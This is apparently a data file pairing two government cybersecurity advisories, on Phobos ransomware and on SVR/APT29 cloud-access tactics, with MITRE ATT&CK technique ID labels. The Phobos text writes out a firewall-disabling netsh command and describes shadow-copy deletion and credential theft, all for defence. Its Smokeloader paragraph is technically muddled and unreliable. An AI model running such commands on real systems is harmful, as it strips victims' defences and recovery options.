Phobos actors run executables like 1saas.exe or cmd.exe to deploy additional Phobos payloads that have elevated privileges enabled,. Additionally, Phobos actors can use the previous commands to perform various windows shell functions. The Windows command shell enables threat actors to control various aspects of a system, with multiple permission levels required for different subsets of commands,.,8,
Smokeloader Deployment
Phobos operations feature a standard three phase process to decrypt a payload that allows the threat actors to deploy additional destructive malware.,9,
For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API functions—which opens an entry point, enabling code to be injected into running processes and allowing the malware to evade network defense tools,. In the second phase, a stealth process is used to obfuscate command and control (C2) activity by producing requests to legitimate websites,.,10,
Within this phase, the shellcode also sends a call from the entry point to a memory container, and prepares a portable executable for deployment in the final stage,.
Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored memory, which is then sent to be extracted from a SHA 256 hash as a payload.,7, Following successful payload decryption, the threat actors can begin downloading additional malware.
Additional Phobos Defense Evasion Capabilities
Phobos ransomware actors have been observed bypassing organizational network defense protocols by modifying system firewall configurations using commands like netsh firewall set opmode mode=disable,. Additionally, Phobos actors can evade detection by using the following tools: Universal Virus Sniffer, Process Hacker, and PowerTool,.
Persistence and Privilege Escalation
According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the bcdedit,.,exe control mechanism. Phobos has also been observed using Windows Startup folders and Run Registry Keys such as C:/Users\Admin\AppData\Local\directory, to maintain persistence within compromised environments.,5,
Additionally, Phobos actors have been observed using built-in Windows API functions, to steal tokens, bypass access controls, and create new processes to escalate privileges by leveraging the SeDebugPrivilege process,. Phobos actors attempt to authenticate using cached password hashes on victim machines until they reach domain administrator access,.
Discovery and Credential Access
Phobos actors additionally use open source tools, such as Bloodhound and Sharphound to enumerate the active directory,. Mimikatz and NirSoft, as well as Remote Desktop Passview to export browser client credentials, have also been used. Furthermore, Phobos ransomware is able to enumerate connected storage devices, running processes, and encrypt user files,.
Exfiltration
Phobos actors have been observed using WinSCP and Mega.io for file exfiltration.,11, They use WinSCP to connect directly from a victim network to an FTP server, they control,. Phobos actors install Mega.io, and use it to export victim files directly to a cloud storage provider,. Data is typically archived as either a .rar or .zip file, to be later exfiltrated. They target legal documentation, financial records, technical documents (including network architecture), and databases for commonly used password management software,.
Impact
After the exfiltration phase, Phobos actors then hunt for backups. They use vssadmin.exe and Windows Management Instrumentation command-line utility (WMIC) to discover and delete volume shadow copies in Windows environments. This prevents victims from recovering files after encryption has taken place,.
Phobos.exe contains functionality to encrypt all connected logical drives on the target host,. Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a unique ransom note which is embedded in the executable. After the ransom note has populated on infected workstations, Phobos ransomware continues to search for and encrypt additional files.
Most extortion, occurs via email; however, some affiliate groups have used voice calls to contact victims. In some cases, Phobos actors have used onion sites to list victims and host stolen victim data. Phobos actors use various instant messaging applications such as ICQ, Jabber, and QQ to communicate,. See Figure 2 for a list of email providers used by the following Phobos affiliates: Devos, Eight, Elbie, Eking, and Faust.,6,

 

Figure 1: Phobos Affiliate Providers List

INDICATORS OF COMPROMISE (IOCs)
See Table 1 through 6 for IOCs obtained from CISA and the FBI investigations from September through November 2023.


The commands above are observed during the execution of a Phobos encryption executable. A Phobos encryption executable spawns a cmd.exe process, which then executes the commands listed in Table 1 with their respective Windows system executables. When the commands above are executed on a Windows system, volume shadow copies are deleted and Windows Firewall is disabled. Additionally, the system’s boot status policy is set to boot even when there are errors during the boot process, and automatic recovery options, like Windows Recovery Environment (WinRE), are disabled for the given boot entry. The system’s backup catalog is also deleted. Finally, the Phobos ransom note is displayed to the end user using mshta.exe.




Disclaimer: Organizations are encouraged to investigate the use of the IOCs in Table 7 for related signs of compromise prior to performing remediation actions.

Disclaimer: Organizations are encouraged to investigate the use of the file hashes in Tables 8 and 9 for related signs of compromise prior to performing remediation actions.


MITRE ATT&CK TECHNIQUES
See Table 10 through 22 for all threat actor tactics and techniques referenced in this advisory.













MITIGATIONS
Secure by Design and Default Mitigations:
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and MS-ISAC recommend that software manufacturers incorporate secure by design and default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The FBI, CISA, and MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture against actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access software by applying recommendations from the joint Guide to Securing Remote Access Software.
Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlist solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Implement log collection best practices and use intrusion detection systems to defend against threat actors manipulating firewall configurations through early detection,CPG 2.T,.

Implement EDR solutions to disrupt threat actor memory allocation techniques.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts at the admin level and higher,CPG 2.A, 2.E,.

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters and no more than 64 characters in length,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems,CPG 2.H,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA, NSA, FBI, and Multi-State Information Sharing and Analysis Center’s (MS-ISAC) Joint #StopRansomware Guide.
SLTT organizations are encouraged to implement MS-ISAC’s Ransomware Defense-in-Depth guidance.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REFERENCES,1, Privacy Affairs: “Moral” 8Base Ransomware Targets 2 New Victims,2, VMware: 8base ransomware: A Heavy Hitting Player,3, Infosecurity Magazine: Phobos Ransomware Family Expands With New FAUST Variant,4, The Record: Hospitals offline across Romania following ransomware attack on IT platform,5, Comparitech: What is Phobos Ransomware & How to Protect Against It?,6, Cisco Talos: Understanding the Phobos affiliate structure and activity,7, Cisco Talos: A deep dive into Phobos ransomware, recently deployed by 8Base group,8, Malwarebytes Labs: A deep dive into Phobos ransomware,9, Any Run: Smokeloader,10, Malpedia: Smokeloader,11, Truesec: A case of the FAUST Ransomware,12, VirusTotal: Phobos Domain #1,13, VirusTotal: Phobos executable: Ahpdate.exe,14, VirusTotal: Phobos GUI extension: ELF File,15, VirusTotal: Phobos IP address: 185.202.0,.,111,16, VirusTotal: Phobos GUI extension: Binary File,17, Cisco Talos GitHub: IOCs/2023/11/deep-dive-into-phobos-ransomware.txt at main
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom-note, communications with Phobos actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The FBI does not conduct its investigative activities or base attribution solely on activities protected by the First Amendment. Your company has no obligation to respond or provide information back to the FBI in response to this engagement. If, after reviewing the information, your company decides to provide referral information to the FBI, it must do so in a manner consistent with federal law. The FBI does not request or expect your company to take any particular action regarding this information other than holding it in confidence due to its sensitive nature.
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, and the MS-ISAC.
ACKNOWLEDGEMENTS
The California Joint Regional Intelligence Center (JRIC, CA) and Israel National Cyber Directorate (INCD) contributed to this CSA.
VERSION HISTORY
February 29, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1136', 'T1104', 'T1553', 'T1482', 'T1542', 'T1548', 'T1531', 'T1587', 'T1218', 'T1490', 'T1059', 'T1547', 'T1029', 'T1027', 'T1140', 'T1567', 'T1205', 'T1071', 'T1591', 'T1020', 'T1528', 'T1201', 'T1486', 'T1048', 'T1560', 'T1562', 'T1213', 'T1003']","{'T1548.004', 'T1597.002', 'T1588.002', 'T1005', 'T1562.009', 'T1078.002', 'T1021.001', 'T1046', 'T1136.001', 'T1548.002', 'T1555.005', 'T1588.001', 'T1069.002', 'T1548.003', 'T1556.002', 'T1598.004', 'T1102.002', 'T1110.001', 'T1059.003', 'T1555.003', 'T1204', 'T1105', 'T1059', 'T1567.002', 'T1490', 'T1599', 'T1562.001', 'T1219', 'T1076', 'T1048.003', 'T1027', 'T1562.002', 'T1140', 'T1070.001', 'T1560.001', 'T1218.005', 'T1657', 'T1070.004', 'T1083', 'T1597.001', 'T1591', 'T1202', 'T1486', 'T1201', 'T1055.001', 'T1555.004', 'T1562.004', 'T1553.006', 'T1547.001'}","{'T1070', 'T1027, T1104', 'T1597.002', 'T1588.002', 'T1005', 'T1562.009', 'T1218.001', 'T1078.002', 'T1021.001', 'T1018', 'T1136.001', 'T1111', 'T1563', 'T1555.005', 'T1069.002', 'T1556.002', 'T1196', 'T1561.001', 'T1598.004', 'T1206', 'T1589.001', 'T1102.002', 'T1082', 'T1110.001', 'T1059.003', 'T1076, T1021.001', 'T1003.001, T1555.003', 'T1105', 'T1059', 'T1567.002', 'T1490', 'T1599', 'T1562.001', 'T1490, T1047', 'T1556.', 'T1048.003', 'T1083, T1486', 'T1027', 'T1016.001', 'T1562.002', 'T1591.001', 'T1140', 'T1489', 'T1110', 'T1560.001', 'T1218.005', 'T1490, T1562.004', 'T1480.001', 'T1657', 'T1070.004', 'T1133', 'T1083', 'T1537', 'T1597.001', 'T1552.001', 'T1547.001, T1134', 'T1078.001', 'T1562.007', 'T1553.005', 'T1591', 'T1190', 'T1202', 'T1486', 'T1201', 'T1078', 'T1566.002', 'T1219, T1204', 'T1555.004', 'T1562.004', 'T1518.001', 'T1526'}","{'T1078, T1190, T1566, T1133', 'T1589', 'T1005', 'T1590, T1589, T1057, T1049, T1071', 'T1027, T1105, T1203', 'T1059, T1055', 'T1027, T1059, T1105', 'T1212', 'T1547, T1134, T1055', 'T1563', 'T1592, T1590', 'T1543, T1068', 'T1486, T1083, T1057', 'T1583', 'T1542', 'T1040, T1021', 'T1040, T1071, T1480', 'T1646', 'T1102', 'T1552', 'T1569', 'T1204', 'T1087, T1069', 'T1559', 'T1218', 'T1059', 'T1490', 'T1059, T1203', 'T1588', 'T1485', 'T1059, T1068', 'T1560, T1567', 'T1076', 'T1087', 'T1219, T1566.001', 'T1027', 'T1201', 'T1486, T1219, T1203', 'T1567', 'T1110', 'T1620', 'T1490, T1562.004', 'T1204, T1486', 'T1071', 'T1556', 'T1071, T1041', 'T1647', 'T1486, T1489, T1490', 'T1486', 'T1210', 'T1078', 'T1048', 'T1003, T1059', 'T1555', 'T1562', 'T1021', 'T1554', 'T1560', 'T1213', 'T1003'}"
1,https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-057a,"



How SVR-Attributed Actors are Adapting to the Move of Government and Corporations to Cloud Infrastructure
OVERVIEW
This advisory details recent tactics, techniques, and procedures (TTPs) of the group commonly known as APT29, also known as Midnight Blizzard, the Dukes, or Cozy Bear.
The UK National Cyber Security Centre (NCSC) and international partners assess that APT29 is a cyber espionage group, almost certainly part of the SVR, an element of the Russian intelligence services. The US National Security Agency (NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and New Zealand Government Communications Security Bureau (GCSB) agree with this attribution and the details provided in this advisory.
This advisory provides an overview of TTPs deployed by the actor to gain initial access into the cloud environment and includes advice to detect and mitigate this activity.
To download the PDF version of this report, click here.
PREVIOUS ACTOR ACTIVITY
The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) cyber actors have targeted governmental, think tank, healthcare, and energy targets for intelligence gain. It has now observed SVR actors expanding their targeting to include aviation, education, law enforcement, local and state councils, government financial departments, and military organizations.
SVR actors are also known for:

The supply chain compromise of SolarWinds software.
Activity that targeted organizations developing the COVID-19 vaccine.

EVOLVING TTPs
As organizations continue to modernize their systems and move to cloud-based infrastructure, the SVR has adapted to these changes in the operating environment.
They have to move beyond their traditional means of initial access, such as exploiting software vulnerabilities in an on-premises network, and instead target the cloud services themselves.
To access the majority of the victims’ cloud hosted network, actors must first successfully authenticate to the cloud provider. Denying initial access to the cloud environment can prohibit SVR from successfully compromising their target. In contrast, in an on-premises system, more of the network is typically exposed to threat actors.
Below describes in more detail how SVR actors are adapting to continue their cyber operations for intelligence gain. These TTPs have been observed in the last 12 months.
ACCESS VIA SERVICE AND DORMANT ACCOUNTS
Previous SVR campaigns reveal the actors have successfully used brute forcing [T1110] and password spraying to access service accounts. This type of account is typically used to run and manage applications and services. There is no human user behind them so they cannot be easily protected with multi-factor authentication (MFA), making these accounts more susceptible to a successful compromise. Service accounts are often also highly privileged depending on which applications and services they’re responsible for managing. Gaining access to these accounts provides threat actors with privileged initial access to a network, to launch further operations.
SVR campaigns have also targeted dormant accounts belonging to users who no longer work at a victim organization but whose accounts remain on the system [T1078.004].
Following an enforced password reset for all users during an incident, SVR actors have also been observed logging into inactive accounts and following instructions to reset the password. This has allowed the actor to regain access following incident response eviction activities.
CLOUD-BASED TOKEN AUTHENTICATION
Account access is typically authenticated by either username and password credentials or system-issued access tokens. The NCSC and partners have observed SVR actors using tokens to access their victims’ accounts, without needing a password [T1528].
The default validity time of system-issued tokens varies dependent on the system; however, cloud platforms should allow administrators to adjust the validity time as appropriate for their users. More information can be found on this in the mitigations section of this advisory.
ENROLLING NEW DEVICES TO THE CLOUD
On multiple occasions, the SVR have successfully bypassed password authentication on personal accounts using password spraying and credential reuse. SVR actors have also then bypassed MFA through a technique known as “MFA bombing” or “MFA fatigue,” in which the actors repeatedly push MFA requests to a victim’s device until the victim accepts the notification [T1621].
Once an actor has bypassed these systems to gain access to the cloud environment, SVR actors have been observed registering their own device as a new device on the cloud tenant [T1098.005]. If device validation rules are not set up, SVR actors can successfully register their own device and gain access to the network.
By configuring the network with device enrollment policies, there have been instances where these measures have defended against SVR actors and denied them access to the cloud tenant.
RESIDENTIAL PROXIES
As network-level defenses improve detection of suspicious activity, SVR actors have looked at other ways to stay covert on the internet. A TTP associated with this actor is the use of residential proxies [T1090.002]. Residential proxies typically make traffic appear to originate from IP addresses within internet service provider (ISP) ranges used for residential broadband customers and hide the true source. This can make it harder to distinguish malicious connections from typical users. This reduces the effectiveness of network defenses that use IP addresses as indicators of compromise, and so it is important to consider a variety of information sources such as application and host-based logging for detecting suspicious activity.
CONCLUSION
The SVR is a sophisticated actor capable of carrying out a global supply chain compromise such as the 2020 SolarWinds, however the guidance in this advisory shows that a strong baseline of cyber security fundamentals can help defend from such actors.
For organizations that have moved to cloud infrastructure, a first line of defense against an actor such as SVR should be to protect against SVR’s TTPs for initial access. By following the mitigations outlined in this advisory, organizations will be in a stronger position to defend against this threat.
Once the SVR gain initial access, the actor is capable of deploying highly sophisticated post compromise capabilities such as MagicWeb, as reported in 2022. Therefore, mitigating against the SVR’s initial access vectors is particularly important for network defenders.
CISA have also produced guidance through their Secure Cloud Business Applications (SCuBA) Project which is designed to protect assets stored in cloud environments.
Some of the TTPs listed in this report, such as residential proxies and exploitation of system accounts, are similar to those reported as recently as January 2024 by Microsoft.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.



Tactic
ID
Technique
Procedure




Credential Access
T1110
Brute Force
The SVR use password spraying and brute forcing as an initial infection vector.


Initial Access
T1078.004
Valid Accounts: Cloud Accounts
The SVR use compromised credentials to gain access to accounts for cloud services, including system and dormant accounts.


Credential Access
T1528
Steal Application Access Token
The SVR use stolen access tokens to login to accounts without the need for passwords.


Credential Access
T1621
Multi-Factor Authentication Request Generation
The SVR repeatedly push MFA requests to a victim’s device until the victim accepts the notification, providing SVR access to the account.


Command and Control
T1090.002
Proxy: External Proxy
The SVR use open proxies in residential IP ranges to blend in with expected IP address pools in access logs.


Persistence
T1098.005
Account Manipulation: Device Registration
The SVR attempt to register their own device on the cloud tenant after acquiring access to accounts.



MITIGATION AND DETECTION
A number of mitigations will be useful in defending against the activity described in this advisory: 

Use multi-factor authentication (/2-factor authentication/two-step verification) to reduce the impact of password compromises. See NCSC guidance: Multifactor Authentication for Online Services and Setting up 2-Step Verification (2SV).
Accounts that cannot use 2SV should have strong, unique passwords. User and system accounts should be disabled when no longer required with a “joiners, movers, and leavers” process in place and regular reviews to identify and disable inactive/dormant accounts. See NCSC guidance: 10 Steps to Cyber Security.
System and service accounts should implement the principle of least privilege, providing tightly scoped access to resources required for the service to function.
Canary service accounts should be created which appear to be valid service accounts but are never used by legitimate services. Monitoring and alerting on the use of these account provides a high confidence signal that they are being used illegitimately and should be investigated urgently.
Session lifetimes should be kept as short as practical to reduce the window of opportunity for an adversary to use stolen session tokens. This should be paired with a suitable authentication method that strikes a balance between regular user authentication and user experience.
Ensure device enrollment policies are configured to only permit authorized devices to enroll. Use zero-touch enrollment where possible, or if self-enrollment is required then use a strong form of 2SV that is resistant to phishing and prompt bombing. Old devices should be prevented from (re)enrolling when no longer required. See NCSC guidance: Device Security Guidance.
Consider a variety of information sources such as application events and host-based logs to help prevent, detect and investigate potential malicious behavior. Focus on the information sources and indicators of compromise that have a better rate of false positives. For example, looking for changes to user agent strings that could indicate session hijacking may be more effective than trying to identify connections from suspicious IP addresses. See NCSC guidance: Introduction to Logging for Security Purposes.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1621', 'T1090.002', 'T1110', 'T1078.004', 'T1098.005', 'T1528'}","



How SVR-Attributed Actors are Adapting to the Move of Government and Corporations to Cloud Infrastructure
OVERVIEW
This advisory details recent tactics, techniques, and procedures (TTPs) of the group commonly known as APT29, also known as Midnight Blizzard, the Dukes, or Cozy Bear.
The UK National Cyber Security Centre (NCSC) and international partners assess that APT29 is a cyber espionage group, almost certainly part of the SVR, an element of the Russian intelligence services. The US National Security Agency (NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and New Zealand Government Communications Security Bureau (GCSB) agree with this attribution and the details provided in this advisory.
This advisory provides an overview of TTPs deployed by the actor to gain initial access into the cloud environment and includes advice to detect and mitigate this activity.
To download the PDF version of this report, click here.
PREVIOUS ACTOR ACTIVITY
The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) cyber actors have targeted governmental, think tank, healthcare, and energy targets for intelligence gain. It has now observed SVR actors expanding their targeting to include aviation, education, law enforcement, local and state councils, government financial departments, and military organizations.
SVR actors are also known for:

The supply chain compromise of SolarWinds software.
Activity that targeted organizations developing the COVID-19 vaccine.

EVOLVING TTPs
As organizations continue to modernize their systems and move to cloud-based infrastructure, the SVR has adapted to these changes in the operating environment.
They have to move beyond their traditional means of initial access, such as exploiting software vulnerabilities in an on-premises network, and instead target the cloud services themselves.
To access the majority of the victims’ cloud hosted network, actors must first successfully authenticate to the cloud provider. Denying initial access to the cloud environment can prohibit SVR from successfully compromising their target. In contrast, in an on-premises system, more of the network is typically exposed to threat actors.
Below describes in more detail how SVR actors are adapting to continue their cyber operations for intelligence gain. These TTPs have been observed in the last 12 months.
ACCESS VIA SERVICE AND DORMANT ACCOUNTS
Previous SVR campaigns reveal the actors have successfully used brute forcing, and password spraying to access service accounts. This type of account is typically used to run and manage applications and services. There is no human user behind them so they cannot be easily protected with multi-factor authentication (MFA), making these accounts more susceptible to a successful compromise. Service accounts are often also highly privileged depending on which applications and services they’re responsible for managing. Gaining access to these accounts provides threat actors with privileged initial access to a network, to launch further operations.
SVR campaigns have also targeted dormant accounts belonging to users who no longer work at a victim organization but whose accounts remain on the system,.
Following an enforced password reset for all users during an incident, SVR actors have also been observed logging into inactive accounts and following instructions to reset the password. This has allowed the actor to regain access following incident response eviction activities.
CLOUD-BASED TOKEN AUTHENTICATION
Account access is typically authenticated by either username and password credentials or system-issued access tokens. The NCSC and partners have observed SVR actors using tokens to access their victims’ accounts, without needing a password,.
The default validity time of system-issued tokens varies dependent on the system; however, cloud platforms should allow administrators to adjust the validity time as appropriate for their users. More information can be found on this in the mitigations section of this advisory.
ENROLLING NEW DEVICES TO THE CLOUD
On multiple occasions, the SVR have successfully bypassed password authentication on personal accounts using password spraying and credential reuse. SVR actors have also then bypassed MFA through a technique known as “MFA bombing” or “MFA fatigue,” in which the actors repeatedly push MFA requests to a victim’s device until the victim accepts the notification,.
Once an actor has bypassed these systems to gain access to the cloud environment, SVR actors have been observed registering their own device as a new device on the cloud tenant,. If device validation rules are not set up, SVR actors can successfully register their own device and gain access to the network.
By configuring the network with device enrollment policies, there have been instances where these measures have defended against SVR actors and denied them access to the cloud tenant.
RESIDENTIAL PROXIES
As network-level defenses improve detection of suspicious activity, SVR actors have looked at other ways to stay covert on the internet. A TTP associated with this actor is the use of residential proxies,. Residential proxies typically make traffic appear to originate from IP addresses within internet service provider (ISP) ranges used for residential broadband customers and hide the true source. This can make it harder to distinguish malicious connections from typical users. This reduces the effectiveness of network defenses that use IP addresses as indicators of compromise, and so it is important to consider a variety of information sources such as application and host-based logging for detecting suspicious activity.
CONCLUSION
The SVR is a sophisticated actor capable of carrying out a global supply chain compromise such as the 2020 SolarWinds, however the guidance in this advisory shows that a strong baseline of cyber security fundamentals can help defend from such actors.
For organizations that have moved to cloud infrastructure, a first line of defense against an actor such as SVR should be to protect against SVR’s TTPs for initial access. By following the mitigations outlined in this advisory, organizations will be in a stronger position to defend against this threat.
Once the SVR gain initial access, the actor is capable of deploying highly sophisticated post compromise capabilities such as MagicWeb, as reported in 2022. Therefore, mitigating against the SVR’s initial access vectors is particularly important for network defenders.
CISA have also produced guidance through their Secure Cloud Business Applications (SCuBA) Project which is designed to protect assets stored in cloud environments.
Some of the TTPs listed in this report, such as residential proxies and exploitation of system accounts, are similar to those reported as recently as January 2024 by Microsoft.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

MITIGATION AND DETECTION
A number of mitigations will be useful in defending against the activity described in this advisory: 

Use multi-factor authentication (/2-factor authentication/two-step verification) to reduce the impact of password compromises. See NCSC guidance: Multifactor Authentication for Online Services and Setting up 2-Step Verification (2SV).
Accounts that cannot use 2SV should have strong, unique passwords. User and system accounts should be disabled when no longer required with a “joiners, movers, and leavers” process in place and regular reviews to identify and disable inactive/dormant accounts. See NCSC guidance: 10 Steps to Cyber Security.
System and service accounts should implement the principle of least privilege, providing tightly scoped access to resources required for the service to function.
Canary service accounts should be created which appear to be valid service accounts but are never used by legitimate services. Monitoring and alerting on the use of these account provides a high confidence signal that they are being used illegitimately and should be investigated urgently.
Session lifetimes should be kept as short as practical to reduce the window of opportunity for an adversary to use stolen session tokens. This should be paired with a suitable authentication method that strikes a balance between regular user authentication and user experience.
Ensure device enrollment policies are configured to only permit authorized devices to enroll. Use zero-touch enrollment where possible, or if self-enrollment is required then use a strong form of 2SV that is resistant to phishing and prompt bombing. Old devices should be prevented from (re)enrolling when no longer required. See NCSC guidance: Device Security Guidance.
Consider a variety of information sources such as application events and host-based logs to help prevent, detect and investigate potential malicious behavior. Focus on the information sources and indicators of compromise that have a better rate of false positives. For example, looking for changes to user agent strings that could indicate session hijacking may be more effective than trying to identify connections from suspicious IP addresses. See NCSC guidance: Introduction to Logging for Security Purposes.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright.






This product is provided subject to this Notification and this Privacy & Use policy.


